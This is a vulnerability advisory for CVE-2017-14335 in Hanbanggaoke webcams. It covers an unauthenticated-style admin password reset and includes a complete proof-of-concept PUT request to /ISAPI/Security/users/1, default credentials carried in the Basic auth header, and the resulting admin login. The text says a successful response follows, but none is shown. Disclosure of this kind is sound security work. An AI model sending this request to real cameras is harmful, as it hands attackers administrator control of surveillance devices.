## Vulnerability summary
The following advisory describes an arbitrary password change vulnerability found in Hanbanggaoke webcams.

Beijing Hanbang Technology, “one of the first enterprises entering into digital video surveillance industry, has been focusing on R&D of products and technology of digital video surveillance field. While providing product and technical support, it also provides overall solution for the industrial system; it has successfully provided system implementation and service supports for several industries.”

## Credit
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program

Vendor response
We tried to contact Hanbanggaoke since the 8th of August 2017, repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for this vulnerability.

## Vulnerability details
User controlled input is not sufficiently sanitized, by sending a PUT request to /ISAPI/Security/users/1 HTTP/1.1 an attacker can change the admin password.

CVE: CVE-2017-14335

## Proof of Concept
In order to exploit the vulnerability, we need to use proxy tool (like Burp). We then connect to the victim’s machine and need to capture the data package.

We then edit the data of the following PUT request:


```
PUT /ISAPI/Security/users/1 HTTP/1.1
Host: x.x.x.x
Content-Length: 321
Cache-Control: max-age=0
Origin: http://x.x.x.x
X-Requested-With: XMLHttpRequest
Authorization: Basic YWRtaW46ODg4ODg4
Content-Type: application/x-www-form-urlencoded
Accept: application/xml, text/xml, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
If-Modified-Since: 0
Referer: http://x.x.x.x/doc/page/paramconfig.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: updateTips=true; streamType=0; BufferLever=1; userInfo80=YWRtaW46ODg4ODg4; DevID=5; language=zh; curpage=paramconfig.asp%254
Connection: close

<?xml version="1.0" encoding="UTF-8"?><User><id>1</id><userName>admin</userName><password>admin</password><bondIpList><bondIp><id>1</id><ipAddress>0.0.0.0</ipAddress><ipv6Address>::</ipv6Address></bondIp></bondIpList><macAddress/><userLevel>administrator</userLevel><attribute><inherent>true</inherent></attribute></User>
```

The successful response will be:

Now, we can login with as administrator:

User: admin
Password: admin